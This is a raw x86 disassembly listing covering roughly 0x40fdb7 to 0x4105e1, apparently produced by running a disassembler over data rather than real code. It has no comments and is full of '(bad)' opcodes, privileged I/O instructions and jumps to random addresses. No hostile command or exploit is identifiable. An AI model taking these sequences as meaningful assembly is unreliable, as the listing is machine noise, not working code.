  40fdb7:	adc    ch,BYTE PTR [ebx+edx*2+0x673ce781]
  40fdbe:	hlt    
  40fdbf:	mov    bl,0x21
  40fdc1:	cmp    ch,BYTE PTR [esi+0x682190ae]
  40fdc7:	cmp    ecx,DWORD PTR [edx+eiz*8-0x4c]
  40fdcb:	mov    edi,DWORD PTR [ebx-0x3f]
  40fdce:	test   BYTE PTR [eax+eax*1],0x88
  40fdd2:	mov    edx,0x8bc5bc3
  40fdd7:	or     DWORD PTR [eax-0x1a6eae92],eax
  40fddd:	mov    ds:0x94911654,eax
  40fde2:	jle    0x40fe2f
  40fde4:	add    BYTE PTR [edi+ebp*1+0x2e],0x8e
  40fde9:	test   eax,0x60ba4cf3
  40fdee:	call   0xf3b2dd3c
  40fdf3:	test   al,0x1d
  40fdf5:	inc    esi
  40fdf6:	fistp  DWORD PTR [edi]
  40fdf8:	sub    dh,BYTE PTR ds:0x187b4ba
  40fdfe:	jmp    0x117e4b3c
  40fe03:	add    cl,BYTE PTR [edi+eiz*1-0x47]
  40fe07:	pop    esp
  40fe08:	mov    al,ds:0xeb816387
  40fe0d:	xchg   edx,eax
  40fe0e:	test   BYTE PTR [ebx-0x6a],cl
  40fe11:	aad    0x7f
  40fe13:	gs sub al,ah
  40fe16:	cmp    al,0xdc
  40fe18:	aam    0xa3
  40fe1a:	xor    BYTE PTR [ecx+0x71f2e0bc],cl
  40fe20:	add    eax,0x8590d128
  40fe25:	xor    BYTE PTR [eax+0x418b40fa],cl
  40fe2b:	ins    BYTE PTR es:[edi],dx
  40fe2c:	fnsave [ebx+0x5a25caa7]
  40fe32:	cld    
  40fe33:	stos   DWORD PTR es:[edi],eax
  40fe34:	pop    eax
  40fe35:	repnz dec esi
  40fe37:	fidiv  DWORD PTR [ecx+0x45241cd3]
  40fe3d:	inc    eax
  40fe3e:	sbb    al,0x3f
  40fe40:	imul   BYTE PTR [eax-0x19]
  40fe43:	pusha  
  40fe44:	aaa    
  40fe45:	(bad)
  40fe48:	nop
  40fe49:	mov    ebp,0x7ee70e2c
  40fe4e:	cmp    esi,DWORD PTR [ebx-0x3e2d01d1]
  40fe54:	fistp  QWORD PTR [ebp-0x6f]
  40fe57:	fld    DWORD PTR [eax]
  40fe59:	pop    ecx
  40fe5a:	retf   
  40fe5b:	adc    bl,BYTE PTR [edx+0x1a3d7725]
  40fe61:	dec    edx
  40fe62:	icebp  
  40fe63:	xchg   ebx,eax
  40fe64:	inc    ecx
  40fe65:	mov    al,0x56
  40fe67:	fwait
  40fe68:	retf   0x3661
  40fe6b:	jo     0x40fee6
  40fe6d:	in     al,dx
  40fe6e:	out    dx,eax
  40fe6f:	cmp    ah,BYTE PTR [ebp+0x3ca5ea0c]
  40fe75:	das    
  40fe76:	cli    
  40fe77:	push   es
  40fe78:	dec    edi
  40fe79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe7a:	scas   al,BYTE PTR es:[edi]
  40fe7b:	out    0x27,al
  40fe7d:	into   
  40fe7e:	push   edi
  40fe7f:	add    DWORD PTR [esi],edx
  40fe81:	inc    eax
  40fe82:	test   DWORD PTR [edi],eax
  40fe84:	aam    0x43
  40fe86:	mov    esp,DWORD PTR [ebx+0x67698b17]
  40fe8c:	lock sub eax,0x8f6da2d0
  40fe92:	cwde   
  40fe93:	outs   dx,BYTE PTR ds:[esi]
  40fe94:	not    DWORD PTR [eax]
  40fe96:	add    DWORD PTR [edi-0x34],eax
  40fe99:	ja     0x40fe93
  40fe9b:	clc    
  40fe9c:	(bad)  
  40fe9d:	or     BYTE PTR [ebp-0x2a],ch
  40fea0:	test   BYTE PTR [ebx],al
  40fea2:	lods   al,BYTE PTR ds:[esi]
  40fea3:	cmp    esp,DWORD PTR [ebx]
  40fea5:	jg     0x40ff23
  40fea7:	jo     0x40fecb
  40fea9:	cld    
  40feaa:	shl    BYTE PTR gs:0x86d1e3ee,0x39
  40feb2:	loop   0x40fee0
  40feb4:	imul   eax,esp,0x9e167906
  40feba:	add    al,0x5b
  40febc:	ds inc eax
  40febe:	ror    BYTE PTR [ebp-0xe3f85d5],cl
  40fec4:	or     ebx,ecx
  40fec6:	inc    ecx
  40fec7:	mov    cs,WORD PTR [esi+0x546ba290]
  40fecd:	or     eax,ebx
  40fecf:	loope  0x40feab
  40fed1:	adc    bl,BYTE PTR [ebp+0x60]
  40fed4:	jmp    0x40fecf
  40fed6:	test   BYTE PTR [ecx+0x52],bl
  40fed9:	sub    DWORD PTR [ecx],0xafec6eba
  40fedf:	pop    ds
  40fee0:	sbb    esi,ecx
  40fee2:	push   esi
  40fee3:	jo     0x40fe75
  40fee5:	or     al,0xde
  40fee7:	push   es
  40fee8:	inc    ebx
  40fee9:	outs   dx,DWORD PTR ds:[esi]
  40feea:	and    al,0xb5
  40feec:	push   es
  40feed:	mov    ch,0x78
  40feef:	jae    0x40ff01
  40fef1:	les    ebx,FWORD PTR [esi]
  40fef3:	push   edi
  40fef4:	cmp    esi,DWORD PTR [edx+0xa]
  40fef7:	push   ecx
  40fef8:	mov    edi,0xa8c08515
  40fefd:	test   bl,ah
  40feff:	popa   
  40ff00:	into   
  40ff01:	lds    edi,FWORD PTR [ecx-0x4b0f29ce]
  40ff07:	ret    
  40ff08:	mov    dh,0x92
  40ff0a:	outs   dx,BYTE PTR ds:[esi]
  40ff0b:	mov    bl,0x5b
  40ff0d:	push   cs
  40ff0e:	fstp   TBYTE PTR [edx+0x2b4628a9]
  40ff14:	inc    edi
  40ff15:	iret   
  40ff16:	loop   0x40fe9d
  40ff18:	and    al,0x9f
  40ff1a:	test   al,dh
  40ff1c:	inc    edx
  40ff1d:	aam    0x74
  40ff1f:	inc    edx
  40ff20:	adc    esp,edi
  40ff22:	arpl   WORD PTR [eax+eiz*1+0x7a],di
  40ff26:	push   0x6359b6a8
  40ff2b:	sub    eax,0x992c3ce2
  40ff30:	stos   DWORD PTR es:[edi],eax
  40ff31:	paddsb mm5,QWORD PTR [esi-0x44]
  40ff35:	pop    es
  40ff36:	push   edx
  40ff37:	test   DWORD PTR [edx+0x30e40d56],edi
  40ff3d:	outs   dx,BYTE PTR ds:[esi]
  40ff3e:	add    edx,edx
  40ff40:	inc    eax
  40ff41:	stc    
  40ff42:	enterw 0xd280,0x39
  40ff47:	jg     0x40ff7d
  40ff49:	sub    ebp,edx
  40ff4b:	out    0x92,al
  40ff4d:	add    DWORD PTR [eax-0x33],ecx
  40ff50:	es xchg BYTE PTR gs:[ecx+0x6a],ah
  40ff55:	push   ss
  40ff56:	jbe    0x40fef6
  40ff58:	(bad)  [ecx]
  40ff5a:	mov    edx,0x518229a1
  40ff5f:	fild   WORD PTR [edx+eax*2-0x55]
  40ff63:	pop    ss
  40ff64:	lock xor DWORD PTR [edi],ebp
  40ff67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff68:	sub    ah,BYTE PTR [bx-0x1]
  40ff6c:	dec    edx
  40ff6d:	cdq    
  40ff6e:	jl     0x40ff13
  40ff70:	aad    0xec
  40ff72:	pop    eax
  40ff73:	dec    esp
  40ff74:	das    
  40ff75:	into   
  40ff76:	call   0xf233b9ad
  40ff7b:	ud1    edx,DWORD PTR [ebx-0x76502cb6]
  40ff82:	fisttp DWORD PTR [ebp-0x518c87fb]
  40ff88:	push   ds
  40ff89:	jnp    0x40ff17
  40ff8b:	test   eax,0x6e2d7a64
  40ff90:	ficom  WORD PTR [eax+0x73d84553]
  40ff96:	jecxz  0x40fff9
  40ff98:	jmp    0x40ff85
  40ff9a:	mov    edx,esi
  40ff9c:	(bad)  
  40ff9d:	addr16 fmul st,st(5)
  40ffa0:	sbb    ah,BYTE PTR [ecx]
  40ffa2:	add    eax,0xd3d1c9fc
  40ffa7:	fdivr  DWORD PTR [eax]
  40ffa9:	push   ebp
  40ffaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffab:	jle    0x40ffbf
  40ffad:	jp     0x40ff9c
  40ffaf:	jnp    0x40ffd9
  40ffb1:	jns    0x40ff99
  40ffb3:	mov    WORD PTR [eax+0x6a25af49],?
  40ffb9:	fcmovu st,st(2)
  40ffbb:	jg     0x410002
  40ffbd:	mov    ds:0x666b1e0d,eax
  40ffc2:	ret    
  40ffc3:	push   eax
  40ffc4:	push   ebp
  40ffc5:	cli    
  40ffc6:	inc    eax
  40ffc7:	imul   esp,DWORD PTR gs:[esi+0x28],0xffffff98
  40ffcc:	inc    ebx
  40ffcd:	mov    eax,ds:0xfd89d0d7
  40ffd2:	mov    DWORD PTR [ebx+edi*4-0x1d3051fb],esp
  40ffd9:	cmp    BYTE PTR ds:0xd5498a02,bl
  40ffdf:	in     eax,dx
  40ffe0:	pop    ss
  40ffe1:	adc    eax,edx
  40ffe3:	in     al,0x9f
  40ffe5:	scas   al,BYTE PTR es:[edi]
  40ffe6:	xlat   BYTE PTR ds:[ebx]
  40ffe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffe8:	(bad)  
  40ffe9:	mov    cl,0x2a
  40ffeb:	mov    BYTE PTR [ebx-0x20],dl
  40ffee:	push   ebp
  40ffef:	dec    esi
  40fff0:	or     eax,0xd015df7b
  40fff5:	jge    0x410035
  40fff7:	mov    ah,BYTE PTR [ebx]
  40fff9:	cmp    BYTE PTR [ecx],ah
  40fffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fffc:	loope  0x410015
  40fffe:	sub    ebp,DWORD PTR [ebp-0x7758b82b]
  410004:	jg     0x40ffeb
  410006:	mov    bl,dh
  410008:	in     eax,dx
  410009:	call   0xec:0xb461ddad
  410010:	in     al,dx
  410011:	pop    es
  410012:	pop    ebx
  410013:	sahf   
  410014:	add    eax,edi
  410016:	shr    BYTE PTR [ebx],0x52
  410019:	fldenv [edx-0x28]
  41001c:	dec    esp
  41001d:	ins    BYTE PTR es:[edi],dx
  41001e:	jp     0x40fff9
  410020:	(bad)  
  410021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410022:	push   0x17
  410024:	sbb    DWORD PTR [ebp+ecx*2+0x74c300d],esp
  41002b:	adc    al,0xb0
  41002d:	pushf  
  41002e:	jae    0x40fffe
  410030:	pop    ebx
  410031:	loop   0x410007
  410033:	unpckhps xmm1,XMMWORD PTR [edi]
  410036:	jno    0x410017
  410038:	aas    
  410039:	add    DWORD PTR [eax],ebx
  41003b:	mov    dh,0xbe
  41003d:	icebp  
  41003e:	push   ebx
  41003f:	push   es
  410040:	in     eax,0xc4
  410042:	sub    BYTE PTR [edx+0x78],ch
  410045:	mov    al,0x9f
  410047:	test   BYTE PTR [edx],bl
  410049:	loop   0x410040
  41004b:	push   cs
  41004c:	sbb    bh,dh
  41004e:	add    ch,BYTE PTR [ebp+edx*8+0x4e]
  410052:	or     al,0xfb
  410054:	jge    0x4100b8
  410056:	cli    
  410057:	fprem1 
  410059:	jns    0x4100a0
  41005b:	pop    ss
  41005c:	imul   ebx,esp,0x43bb2eb1
  410062:	mov    edi,0x9c450fb3
  410067:	pop    ebx
  410068:	mov    dl,0xff
  41006a:	dec    edi
  41006b:	ins    BYTE PTR es:[edi],dx
  41006c:	mov    al,ds:0x93449352
  410071:	and    cl,BYTE PTR [ecx]
  410073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410074:	js     0x410073
  410076:	mov    edx,0xd5751860
  41007b:	sub    eax,0x8d81bfb8
  410080:	ss int 0x49
  410083:	stc    
  410084:	jl     0x4100b5
  410086:	or     BYTE PTR [edi-0x41bc6c84],dl
  41008c:	imul   DWORD PTR [edx]
  41008e:	mov    ecx,0xef6ed5a6
  410093:	mov    ebp,0xfdd7e658
  410098:	pop    ss
  410099:	out    0x9f,al
  41009b:	ffree  st(0)
  41009d:	retf   
  41009e:	adc    DWORD PTR [ecx],eax
  4100a0:	das    
  4100a1:	jnp    0x41003d
  4100a3:	stos   DWORD PTR es:[edi],eax
  4100a4:	in     eax,dx
  4100a5:	pop    edi
  4100a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100a7:	cld    
  4100a8:	ss sub al,0x37
  4100ab:	sbb    al,0xa4
  4100ad:	xchg   DWORD PTR [ebx+esi*4+0x0],esp
  4100b1:	into   
  4100b2:	xor    ah,BYTE PTR [esp+ebx*1+0x246979c3]
  4100b9:	push   es
  4100ba:	pop    ds
  4100bb:	mov    dh,0x32
  4100bd:	dec    ebp
  4100be:	cwde   
  4100bf:	and    ebx,ebp
  4100c1:	xlat   BYTE PTR ds:[ebx]
  4100c2:	aad    0x36
  4100c4:	add    BYTE PTR [ebx],ah
  4100c6:	(bad)  
  4100c7:	pop    esp
  4100c8:	imul   ecx,esp,0x9a67be4a
  4100ce:	cwde   
  4100cf:	or     dl,BYTE PTR [ebx-0x30]
  4100d2:	out    dx,eax
  4100d3:	fst    QWORD PTR [ebx-0x3]
  4100d6:	push   edi
  4100d7:	or     BYTE PTR [ebx+eiz*2],0x90
  4100db:	mov    ah,0x5e
  4100dd:	adc    BYTE PTR [ebx-0x7d],bl
  4100e0:	pop    ss
  4100e1:	push   esp
  4100e2:	or     dl,BYTE PTR [ebx+edi*8]
  4100e5:	pop    ecx
  4100e6:	and    eax,0x7f25b
  4100eb:	sbb    ecx,DWORD PTR [edx]
  4100ed:	repz or DWORD PTR [edx+ebx*2+0x6d],ecx
  4100f2:	lds    esi,FWORD PTR [edi-0x65]
  4100f5:	pop    esp
  4100f6:	jg     0x41010e
  4100f8:	or     eax,0xd7b41d62
  4100fd:	cdq    
  4100fe:	jns    0x4100b0
  410100:	push   ebp
  410101:	popa   
  410102:	jmp    DWORD PTR [esi]
  410104:	xchg   esp,eax
  410105:	add    BYTE PTR [edx],cl
  410107:	push   ebx
  410108:	outs   dx,BYTE PTR ds:[esi]
  410109:	loopne 0x4100be
  41010b:	jg     0x4100d8
  41010d:	(bad)  
  41010e:	out    0xb4,eax
  410110:	sbb    eax,0x152013a8
  410115:	int3   
  410116:	or     bl,BYTE PTR [esi+0x3bc0fc4e]
  41011c:	cmp    eax,0x912321c1
  410121:	test   eax,0x1473a8c2
  410126:	outs   dx,BYTE PTR ds:[esi]
  410127:	mov    ebx,DWORD PTR [edx+0x43]
  41012a:	and    bh,dh
  41012c:	pop    esp
  41012d:	ins    DWORD PTR es:[edi],dx
  41012e:	push   es
  41012f:	mov    bl,0x55
  410131:	daa    
  410132:	dec    ebx
  410133:	sub    bl,BYTE PTR [eax+0x52]
  410136:	stos   DWORD PTR es:[edi],eax
  410137:	inc    esp
  410138:	inc    ecx
  410139:	sub    ecx,DWORD PTR ds:0xa55248ac
  41013f:	sbb    edi,DWORD PTR [ebp-0x44888479]
  410145:	xchg   esp,eax
  410146:	(bad)  
  410147:	or     bh,al
  410149:	xor    BYTE PTR [edx+0xc],al
  41014c:	xchg   ecx,eax
  41014d:	mov    ebp,ebp
  41014f:	popf   
  410150:	and    eax,0x463a5cbe
  410155:	jl     0x410102
  410157:	das    
  410158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410159:	adc    al,0x83
  41015b:	jae    0x4101d4
  41015d:	shl    DWORD PTR [esi-0x4],1
  410160:	outs   dx,BYTE PTR ds:[esi]
  410161:	pop    ebx
  410162:	jmp    0xc46f:0xee62ceb7
  410169:	(bad)  
  41016a:	mov    DWORD PTR [eax-0x11443ec9],ebx
  410170:	jne    0x41011c
  410172:	sbb    BYTE PTR [ebx-0x55],bh
  410175:	inc    esp
  410176:	dec    ebp
  410177:	mov    edi,0xb6e82b63
  41017c:	inc    DWORD PTR [eax]
  41017e:	repnz mov ecx,0x1eba994e
  410184:	push   ecx
  410185:	bound  ecx,QWORD PTR [ebx]
  410187:	or     dl,ch
  410189:	cmp    edx,DWORD PTR [ecx]
  41018b:	dec    ebp
  41018c:	mov    cl,0xa4
  41018e:	ja     0x4101ba
  410190:	leave  
  410191:	jno    0x4101ca
  410193:	imul   ebp,DWORD PTR [edi+0xc],0xffffffc0
  410197:	in     al,dx
  410198:	fwait
  410199:	adc    ebx,DWORD PTR [edi]
  41019b:	imul   ebp,DWORD PTR [ebp+0x3ff32ee2],0xa4dca152
  4101a5:	dec    ecx
  4101a6:	lea    ebp,[edx-0xceb565e]
  4101ac:	mov    bl,0xc3
  4101ae:	out    dx,eax
  4101af:	call   0x1eb4:0x8aef714d
  4101b6:	leave  
  4101b7:	in     al,dx
  4101b8:	xchg   ecx,eax
  4101b9:	pop    esi
  4101ba:	dec    edi
  4101bb:	jae    0x41022d
  4101bd:	and    al,0x6e
  4101bf:	sti    
  4101c0:	lods   al,BYTE PTR ds:[esi]
  4101c1:	and    bh,ch
  4101c3:	and    eax,0x245ae008
  4101c8:	daa    
  4101c9:	aas    
  4101ca:	js     0x410174
  4101cc:	mov    esp,0x77698e9a
  4101d1:	inc    esp
  4101d2:	sbb    eax,0x8964f62e
  4101d7:	clc    
  4101d8:	jbe    0x410224
  4101da:	cmp    ebp,DWORD PTR ds:0x6e297181
  4101e0:	arpl   WORD PTR [esi+0x8],bp
  4101e3:	jno    0x4101bb
  4101e5:	fbld   TBYTE PTR [eax-0x15f9d439]
  4101eb:	jmp    0x3d31:0x6082883f
  4101f2:	adc    bh,al
  4101f4:	sbb    al,BYTE PTR [ebx+edi*2+0x701c97df]
  4101fb:	test   DWORD PTR [esi-0x6ced55d],ebx
  410201:	cbw    
  410203:	push   ebx
  410204:	adc    BYTE PTR [ebx+0x2e2c1ce3],ch
  41020a:	mov    ah,bl
  41020c:	sbb    DWORD PTR [ebp+0xa533713],ecx
  410212:	fcomp  DWORD PTR [esp+eiz*8+0x4c7bb1c1]
  410219:	dec    ebp
  41021a:	lds    ebx,FWORD PTR [ecx-0x5e56a079]
  410220:	dec    ecx
  410221:	int3   
  410222:	fistp  DWORD PTR [ebx]
  410224:	enter  0x6f2f,0xeb
  410228:	sub    BYTE PTR [edx],ah
  41022a:	(bad)  
  41022b:	sbb    ebx,DWORD PTR [ebx-0x23]
  41022e:	adc    edx,ecx
  410230:	xchg   esp,eax
  410231:	mov    eax,ds:0x4143d31e
  410236:	sti    
  410237:	gs mov al,0x21
  41023a:	mov    ?,WORD PTR [edx-0x40abf15]
  410240:	arpl   ax,si
  410242:	pushf  
  410243:	lds    esp,FWORD PTR cs:[esi]
  410246:	mov    edx,0xe35aecb5
  41024b:	out    dx,eax
  41024c:	push   esi
  41024d:	add    esi,edi
  41024f:	out    0x7,eax
  410251:	and    al,0x82
  410253:	les    eax,FWORD PTR [ebx]
  410255:	lods   eax,DWORD PTR ds:[esi]
  410256:	je     0x410257
  410258:	mov    dl,BYTE PTR [edx]
  41025a:	mov    ah,0x2a
  41025c:	cmp    ebx,DWORD PTR [edx]
  41025e:	stc    
  41025f:	dec    ecx
  410260:	ret    0xeb95
  410263:	das    
  410264:	add    al,0x9e
  410266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410267:	loop   0x4102e4
  410269:	es int 0xfb
  41026c:	dec    ecx
  41026d:	add    ebx,DWORD PTR [esi-0x32]
  410270:	or     BYTE PTR [esi],ah
  410272:	nop
  410273:	or     al,0x2f
  410275:	sub    eax,0x431ec419
  41027a:	lds    esp,FWORD PTR [edi+0x3860e06a]
  410280:	mov    ds:0x9477e291,eax
  410285:	jecxz  0x4102f3
  410287:	sbb    BYTE PTR ds:0x4e4e48e1,bl
  41028d:	pop    es
  41028e:	mov    ds:0x44aa85f3,eax
  410293:	retf   0x533e
  410296:	addr16 js 0x4102f2
  410299:	or     al,al
  41029b:	jbe    0x410279
  41029d:	in     eax,0x79
  41029f:	mov    edx,0x88337bd4
  4102a4:	jne    0x41030c
  4102a6:	stc    
  4102a7:	xor    BYTE PTR [esi+ebp*1+0x6fe7ecc9],bl
  4102ae:	push   esi
  4102af:	pop    es
  4102b0:	xadd   BYTE PTR [esi-0x15dd2af7],al
  4102b7:	sbb    DWORD PTR [ebx+0x5eb06795],ecx
  4102bd:	out    0xa,al
  4102bf:	in     al,dx
  4102c0:	sub    dh,BYTE PTR [eax-0xcc7e046]
  4102c6:	cmp    al,0x69
  4102c8:	sub    DWORD PTR [eax+0x38],esp
  4102cb:	dec    ebx
  4102cc:	mov    dl,0xf2
  4102ce:	xchg   ebp,eax
  4102cf:	in     al,0xb2
  4102d1:	test   DWORD PTR [esi+0x131c09ec],edi
  4102d7:	test   bh,cl
  4102d9:	pop    esi
  4102da:	je     0x4102c9
  4102dc:	out    0xaa,al
  4102de:	not    BYTE PTR [edx+0x2d54320]
  4102e4:	push   esp
  4102e5:	adc    DWORD PTR [eax+ebp*1-0x33b92299],edx
  4102ec:	fdiv   st(2),st
  4102ee:	mov    dh,0x67
  4102f0:	enter  0x24d7,0xcb
  4102f4:	xor    ebp,DWORD PTR [ebp-0x42]
  4102f7:	nop
  4102f8:	in     eax,0x42
  4102fa:	idiv   DWORD PTR ds:0x3c7ee0c
  410300:	sub    dh,bl
  410302:	cmp    DWORD PTR [edi+ebx*2+0x6a],edx
  410306:	dec    esi
  410307:	pop    edx
  410308:	push   esp
  410309:	into   
  41030a:	cmp    al,cl
  41030c:	pop    edi
  41030d:	jb     0x41029c
  41030f:	push   esp
  410311:	inc    ebp
  410312:	dec    edi
  410313:	aad    0xdd
  410315:	mov    gs,WORD PTR [esp+edx*4+0x8]
  410319:	dec    edx
  41031a:	enter  0xdab6,0xa2
  41031e:	in     eax,0x37
  410320:	fnstcw WORD PTR [eax+0x4e085bf4]
  410326:	ret    
  410327:	mov    dh,0xe3
  410329:	or     al,0x3f
  41032b:	test   BYTE PTR [eax-0x5f],al
  41032e:	rol    DWORD PTR [ecx+0x4d],0x68
  410332:	jae    0x41031e
  410334:	nop
  410335:	push   eax
  410336:	ss jo  0x41033f
  410339:	sti    
  41033a:	xor    DWORD PTR [ecx],edx
  41033c:	push   eax
  41033d:	fstp   TBYTE PTR [edi+eax*4-0x58446cf0]
  410344:	pop    esi
  410345:	adc    DWORD PTR [ecx-0x5607f1b3],ecx
  41034b:	xor    al,0x96
  41034d:	cli    
  41034e:	xor    al,0xf2
  410350:	xor    DWORD PTR [ebx],eax
  410352:	jmp    0x4103a6
  410354:	clc    
  410355:	icebp  
  410356:	push   ebp
  410357:	xor    al,0xae
  410359:	push   ebp
  41035a:	jb     0x41031f
  41035c:	jo     0x41031c
  41035e:	sub    eax,0xbc423722
  410363:	jns    0x410360
  410365:	retf   0xc222
  410368:	push   ebp
  410369:	lods   al,BYTE PTR ds:[esi]
  41036a:	mov    ebx,0x74955aec
  41036f:	add    eax,0x8adc1b5b
  410374:	ret    0x505f
  410377:	and    al,0xa
  410379:	mov    WORD PTR [edi+0x11a6c4f3],ss
  41037f:	ins    BYTE PTR es:[edi],dx
  410380:	stos   DWORD PTR es:[edi],eax
  410381:	sub    dl,al
  410383:	and    BYTE PTR [ebp+0x11],ah
  410386:	add    eax,0x39a298fa
  41038b:	adc    ebx,DWORD PTR [eax+0x2020c3cf]
  410391:	and    al,0x70
  410393:	xor    dh,bl
  410395:	xchg   BYTE PTR [edi],al
  410397:	cmp    bh,BYTE PTR [eax+0x71]
  41039a:	cmp    esi,DWORD PTR [edi-0xc644799]
  4103a0:	shl    DWORD PTR [ebp-0x43991ba3],1
  4103a6:	out    0x85,eax
  4103a8:	cmp    eax,DWORD PTR [esi]
  4103aa:	pushf  
  4103ab:	sub    eax,0x95e14c14
  4103b0:	stos   BYTE PTR es:[edi],al
  4103b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103b2:	dec    eax
  4103b3:	push   ecx
  4103b4:	bound  eax,QWORD PTR [ebx]
  4103b6:	push   ebx
  4103b7:	mov    al,ds:0x909a9c27
  4103bc:	xor    eax,0x6e133ef
  4103c1:	jmp    0x410395
  4103c3:	adc    al,0xe4
  4103c5:	xor    al,0x50
  4103c7:	ins    BYTE PTR es:[edi],dx
  4103c8:	cs dec eax
  4103ca:	fidivr DWORD PTR [edi]
  4103cc:	dec    edi
  4103cd:	jmp    0x5e3a:0x6522696f
  4103d4:	jns    0x4103fe
  4103d6:	add    dh,BYTE PTR [ebx+ebp*1-0x4b]
  4103da:	fcom   DWORD PTR [ebp+0x28]
  4103dd:	sbb    bh,BYTE PTR [edi+0x3b0b8704]
  4103e3:	mov    eax,0x8535bfbf
  4103e8:	mov    bl,0x2f
  4103ea:	and    BYTE PTR [esi+0x8],bh
  4103ed:	rcr    DWORD PTR [ecx],0x98
  4103f0:	pop    ss
  4103f1:	add    edx,DWORD PTR [ecx+0x23fa58ef]
  4103f7:	lock push ebx
  4103f9:	(bad)  
  4103fa:	sti    
  4103fb:	scas   al,BYTE PTR es:[edi]
  4103fc:	jmp    0x14a56a62
  410401:	and    edi,DWORD PTR [esp+ecx*1+0xec73521]
  410408:	mov    BYTE PTR [eax-0x2f],dl
  41040b:	loope  0x4103c5
  41040d:	ja     0x41048d
  41040f:	nop
  410410:	sbb    DWORD PTR [esi+esi*8],edx
  410413:	in     al,0x2
  410415:	stc    
  410416:	lea    edi,[esi-0x3f21b626]
  41041c:	aam    0x48
  41041e:	ds jg  0x410469
  410421:	fisubr WORD PTR [edi-0x30d9429d]
  410427:	scas   eax,DWORD PTR es:[edi]
  410428:	sbb    eax,0x3fa7883b
  41042d:	imul   edi,DWORD PTR [edi],0x5d
  410430:	mov    bh,BYTE PTR [edx-0xca20598]
  410436:	xor    BYTE PTR [edx],cl
  410438:	retf   0x83ca
  41043b:	dec    edi
  41043c:	bound  ebx,QWORD PTR ds:0x667cb9ad
  410442:	nop
  410443:	femms  
  410445:	lahf   
  410446:	clc    
  410447:	imul   edx,DWORD PTR [ebx],0xea63c89d
  41044d:	push   edi
  41044e:	stos   BYTE PTR es:[edi],al
  41044f:	mov    eax,DWORD PTR [ebx+0x4]
  410452:	adc    BYTE PTR [ebp+0x3853948b],bl
  410458:	mov    cl,0xd4
  41045a:	cmc    
  41045b:	push   0x50c7412a
  410460:	mov    al,0x83
  410462:	fdivr  DWORD PTR ds:0x64ae6798
  410468:	or     eax,ebp
  41046a:	out    0x2,eax
  41046c:	jmp    0x441953e1
  410471:	mov    esi,0x998038f0
  410476:	dec    ecx
  410477:	jno    0x41040e
  410479:	fild   DWORD PTR [ebx]
  41047b:	popa   
  41047c:	(bad)  
  41047d:	jb     0x41043d
  41047f:	xor    eax,0x23754a57
  410484:	mov    DWORD PTR [edx-0x6482d04f],edx
  41048a:	mov    eax,ds:0x7b9fb7
  41048f:	pop    eax
  410490:	call   0xc123a0ea
	...
  410511:	add    BYTE PTR [eax],al
  410513:	add    BYTE PTR [ebp+0x6b],ah
  410516:	sub    edi,0xffffff8f
  410519:	out    dx,eax
  41051a:	ins    DWORD PTR es:[edi],dx
  41051b:	jmp    0x410577
  41051d:	sar    ecx,cl
  41051f:	sbb    edx,DWORD PTR [edi+edx*2]
  410522:	hlt    
  410523:	pop    ebp
  410524:	cmp    esi,DWORD PTR [eax+0x7690000]
  41052a:	add    BYTE PTR [eax],al
  41052c:	test   esp,ecx
  41052e:	(bad)  
  410530:	jge    0x4104cd
  410532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410533:	enter  0xeebf,0x6e
  410537:	and    DWORD PTR [ebx],ebp
  410539:	add    ch,BYTE PTR [esi]
  41053b:	mov    bh,0xc0
  41053d:	aad    0xbe
  41053f:	add    ecx,esp
  410541:	daa    
  410542:	xor    DWORD PTR [edx],edi
  410544:	inc    edx
  410545:	pop    ecx
  410546:	shr    BYTE PTR [ecx+0x103bfa6d],1
  41054c:	or     ebp,esi
  41054e:	push   0x1b08fd16
  410553:	cmp    DWORD PTR [edi-0x40ca36ac],ebx
  410559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41055a:	(bad)  
  41055b:	aas    
  41055c:	loope  0x4105d1
  41055e:	mov    edi,0xf4e5480e
  410563:	(bad)  [edx+ebx*2]
  410566:	cmp    DWORD PTR [ebp+0x60],0xfffffff7
  41056a:	fwait
  41056b:	imul   ebx,edx,0x3d
  41056e:	adc    esp,ebp
  410570:	xchg   ebp,eax
  410571:	pop    es
  410572:	xchg   ebx,eax
  410573:	retf   
  410574:	sub    bh,dh
  410576:	fdiv   DWORD PTR [ebp-0x7e]
  410579:	push   ecx
  41057a:	aas    
  41057b:	push   ebp
  41057c:	inc    eax
  41057d:	(bad)  
  41057e:	cmc    
  41057f:	mov    BYTE PTR [edi-0x6ac63e8f],dh
  410585:	xchg   ebx,eax
  410586:	xchg   DWORD PTR [ecx-0x69],edx
  410589:	stos   BYTE PTR es:[edi],al
  41058a:	dec    esi
  41058b:	push   0x53
  41058d:	loope  0x4105e0
  41058f:	inc    edi
  410590:	jbe    0x4105c5
  410592:	xor    BYTE PTR [eax],al
  410594:	mov    esi,0xebd5fc26
  410599:	and    BYTE PTR [ebx+ebx*8+0x2f],dh
  41059d:	ja     0x410613
  41059f:	imul   esp,DWORD PTR [ebp-0x23a2a5f7],0x37d96cd6
  4105a9:	xor    eax,ebx
  4105ab:	jg     0x4105cc
  4105ad:	popa   
  4105ae:	imul   edi,DWORD PTR [ebx+0x32],0x7ef835c9
  4105b5:	mov    dl,0x63
  4105b7:	mov    esp,0xca4949a
  4105bc:	test   DWORD PTR [ebx-0x1f],ecx
  4105bf:	scas   eax,DWORD PTR es:[edi]
  4105c0:	lahf   
  4105c1:	fistp  QWORD PTR [eax+0x16092cad]
  4105c7:	fs pop eax
  4105c9:	(bad)  
  4105ca:	lds    esp,FWORD PTR [ebp+0x61667707]
  4105d0:	cmovne ebp,DWORD PTR [edx-0x46718b75]
  4105d7:	int    0xdd
  4105d9:	aas    
  4105da:	mov    al,ds:0xc5c01df6
  4105df:	not    dh
  4105e1:	stc    
